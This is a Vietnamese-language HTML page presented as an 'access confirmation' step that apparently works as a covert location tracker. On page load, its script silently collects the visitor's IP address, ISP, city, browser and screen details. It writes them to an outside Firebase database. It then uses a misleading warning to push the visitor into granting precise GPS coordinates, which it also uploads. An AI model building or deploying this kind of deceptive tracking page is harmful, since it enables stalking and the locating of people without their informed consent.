<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<title>Xác nhận truy cập</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body { font-family: system-ui, sans-serif; max-width: 480px; margin: 40px auto; padding: 0 16px; text-align: center; }
  button { padding: 14px 28px; font-size: 16px; background: #2563eb; color: white; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
  button:disabled { background: #94a3b8; cursor: not-allowed; }
  #log { background:#111; color:#0f0; padding:12px; font-size:12px; white-space:pre-wrap; border-radius:6px; text-align:left; max-height:300px; overflow:auto; margin-top:16px; }
  .ok { color: #16a34a; font-weight: 600; }
  .warn { color: #dc2626; font-weight: 600; }
</style>
</head>
<body>
<h2>Xác nhận truy cập</h2>
<p id="status">Đang lấy thông tin...</p>
<button id="btn" style="display:none">📍 Xác nhận vị trí chính xác</button>
<pre id="log"></pre>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const app = initializeApp({
  databaseURL: "https://shopmduy-default-rtdb.asia-southeast1.firebasedatabase.app/"
});
const db = getDatabase(app);

const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
const btn = document.getElementById("btn");

function log(m) {
  console.log(m);
  logEl.textContent += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}

function countryFlag(code) {
  if (!code || code.length !== 2) return "🏳";
  code = code.toUpperCase();
  return String.fromCodePoint(0x1F1E6 + code.charCodeAt(0) - 65,
                              0x1F1E6 + code.charCodeAt(1) - 65);
}

async function getIPInfo() {
  try {
    const r = await fetch("https://ipwho.is/", { cache: "no-store" });
    const d = await r.json();
    if (!d.ip) throw new Error("no ip");
    return {
      ip: d.ip,
      country: d.country_code || "?",
      region: d.region || "?",
      city: d.city || "?",
      org: (d.connection && d.connection.isp) || "?",
      ipLat: d.latitude,
      ipLng: d.longitude
    };
  } catch (e) {
    log("Không lấy được IP: " + e.message);
    return { ip: "?", country: "?", region: "?", city: "?", org: "?" };
  }
}

function getGPS() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject(new Error("Thiết bị không hỗ trợ GPS"));
    navigator.geolocation.getCurrentPosition(
      pos => resolve({
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: Math.round(pos.coords.accuracy)
      }),
      err => reject(new Error(err.message)),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

async function saveToFirebase(record) {
  const result = await push(ref(db, "visits"), record);
  return result.key;
}

(async () => {
  try {
    log("1. Lấy thông tin IP...");
    const info = await getIPInfo();
    log("   IP: " + info.ip);
    log("   Khu vực: " + info.city + ", " + info.region + ", " + info.country);

    // Lưu bản ghi IP trước (để không mất nếu user không bấm GPS)
    const ipRecord = {
      ip: info.ip,
      org: info.org,
      country: info.country,
      flag: countryFlag(info.country),
      region: info.region,
      city: info.city,
      latitude: info.ipLat || "",
      longitude: info.ipLng || "",
      source: "ip",
      userAgent: navigator.userAgent,
      language: navigator.language,
      screen: screen.width + "x" + screen.height,
      time: new Date().toISOString(),
      sent: false,
      status: "⏳ chờ gửi",
      sent_at: ""
    };

    log("2. Ghi Firebase (IP)...");
    const keyIP = await saveToFirebase(ipRecord);
    log("   OK, key=" + keyIP);

    statusEl.innerHTML = '<span class="warn">⚠️ Vị trí IP có thể lệch 100+ km.</span><br>Bấm nút bên dưới để có vị trí chính xác ±10m.';
    btn.style.display = "inline-block";

    // Xử lý khi bấm nút GPS
    btn.addEventListener("click", async () => {
      btn.disabled = true;
      btn.textContent = "Đang lấy GPS...";

      try {
        log("3. Lấy GPS...");
        const gps = await getGPS();
        log("   OK: " + gps.lat + ", " + gps.lng + " (±" + gps.accuracy + "m)");

        const gpsRecord = {
          ...ipRecord,
          latitude: gps.lat,
          longitude: gps.lng,
          accuracy_m: gps.accuracy,
          source: "gps",
          time: new Date().toISOString(),
          sent: false,
          status: "⏳ chờ gửi",
          sent_at: ""
        };

        log("4. Ghi Firebase (GPS)...");
        const keyGPS = await saveToFirebase(gpsRecord);
        log("   OK, key=" + keyGPS);

        statusEl.innerHTML = '<span class="ok">✅ Đã xác nhận vị trí ±' + gps.accuracy + 'm</span>';
        btn.style.display = "none";
        log("XONG");
      } catch (e) {
        log("LỖI GPS: " + e.message);
        statusEl.innerHTML = '<span class="warn">❌ ' + e.message + '</span><br>Bạn cần bấm "Cho phép" khi trình duyệt hỏi.';
        btn.disabled = false;
        btn.textContent = "📍 Thử lại";
      }
    });

  } catch (e) {
    log("DỪNG: " + e.message);
    statusEl.textContent = "Lỗi: " + e.message;
  }
})();
</script>
</body>
</html>
